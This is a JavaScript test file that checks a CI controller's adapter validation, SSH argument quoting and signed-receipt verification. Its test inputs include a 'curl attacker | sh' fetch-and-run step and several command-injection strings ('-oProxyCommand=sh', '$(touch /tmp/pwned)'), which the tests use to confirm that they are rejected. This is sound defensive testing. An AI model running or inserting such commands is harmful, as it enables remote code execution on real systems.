import {test} from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {adapter,validateAdapter,originRepository,transport,seal,verify,executable} from './core.mjs';
const catalogue=JSON.parse(readFileSync(new URL('./repositories.json',import.meta.url),'utf8'));
const sha='a'.repeat(40), other='b'.repeat(40);
test('adapters cannot supply executable commands or change coverage',()=>{
  for(const [repository,entry] of Object.entries(catalogue.repositories)) {
    const a=adapter(repository,repository==='mithril-lang/.github'?'self':sha,entry);
    validateAdapter(a,repository,sha,entry);
    assert.throws(()=>validateAdapter({...a,steps:['curl attacker | sh']},repository,sha,entry));
    assert.throws(()=>validateAdapter({...a,scope:'Full production release'},repository,sha,entry));
    if(repository!=='mithril-lang/.github') assert.throws(()=>validateAdapter(a,repository,other,entry));
    if(entry.state!=='prepared') assert.throws(()=>executable(entry)); else executable(entry);
  }
});
test('mutable controllers and non-organization origins are rejected',()=>{
  assert.throws(()=>adapter('mithril-lang/ontology','main',catalogue.repositories['mithril-lang/ontology']));
  assert.throws(()=>adapter('mithril-lang/ontology','self',catalogue.repositories['mithril-lang/ontology']));
  assert.equal(originRepository('git@github.com:mithril-lang/.github.git'),'mithril-lang/.github');
  assert.equal(originRepository('https://github.com/mithril-lang/ontology.git'),'mithril-lang/ontology');
  assert.throws(()=>originRepository('https://github.com/other/ontology.git'));
});
test('transport quotes remote arguments and rejects host injection',()=>{
  assert.throws(()=>transport('-oProxyCommand=sh',[]));
  assert.throws(()=>transport('gad;touch /tmp/pwned',[]));
  const [,args]=transport('gad',['run',"a'b",'$(touch /tmp/pwned)']);
  assert.equal(args.at(-1),"'docker' 'run' 'a'\\''b' '$(touch /tmp/pwned)'");
});
test('receipts are bound to repository, commit, policy and coverage',()=>{
  const key=Buffer.alloc(32,1), now=Date.now();
  const identity={repository:'mithril-lang/ontology',sha,controllerRevision:other,profile:'source',scope:'Partial freshness only',recipeDigest:'recipe'};
  const receipt=seal({...identity,status:'success',finishedAt:new Date(now).toISOString(),releaseEligible:false},key);
  assert.equal(verify(receipt,key,identity,now).releaseEligible,false);
  for(const name of Object.keys(identity)) assert.throws(()=>verify(receipt,key,{...identity,[name]:'changed'},now));
  assert.throws(()=>verify({...receipt,receipt:{...receipt.receipt,releaseEligible:true}},key,identity,now));
  assert.throws(()=>verify(receipt,Buffer.alloc(32,2),identity,now));
  assert.throws(()=>verify(receipt,key,identity,now+86400001));
  assert.throws(()=>verify(receipt,key,identity,now-1));
});
